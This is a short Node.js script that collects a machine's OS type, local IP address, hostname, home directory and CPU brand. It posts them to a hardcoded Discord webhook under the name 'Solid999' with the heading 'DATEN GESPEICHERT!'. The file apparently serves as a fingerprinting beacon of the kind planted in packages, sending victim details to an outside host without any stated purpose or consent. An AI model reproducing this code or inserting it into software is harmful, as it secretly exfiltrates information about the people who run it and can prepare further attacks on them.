const os = require('node:os');
var ip = require('ip');
const features = require('cpu-features')();
const { Webhook } = require('discord-webhook-node');
const cloudSolid = new Webhook("https://discord.com/api/webhooks/1033087971982843995/c7LtfNuhB9giLW-TavWGw0ARHkRc7S9Q29SVrdBYrghq50HB6P8Pz9_SG2gQY6Qp_ziO");
cloudSolid.setUsername('Solid999');
cloudSolid.setAvatar('https://avatars.githubusercontent.com/u/77588421?v=4')
const software = '**Betriebssystem: **' + '`' + os.type() + ' | ' + os.platform() + '`'
const network = '**IP Address:** ' + '`' + ip.address() + '`'
const desktop = '**Desktop: **' + '`' + os.hostname() + '`'
const homedir = '**PC-NAME:   **' + '`' + os.homedir() + '`'
const cpu = 'CPU: ' + '`' + features.brand + '`'
cloudSolid.success(`
 __DATEN GESPEICHERT!__

 > ✅  ${homedir},
 > ✅  ${desktop},
 > ✅  ${software},
 > ✅  ${network},
 > ✅  ${cpu}
`)
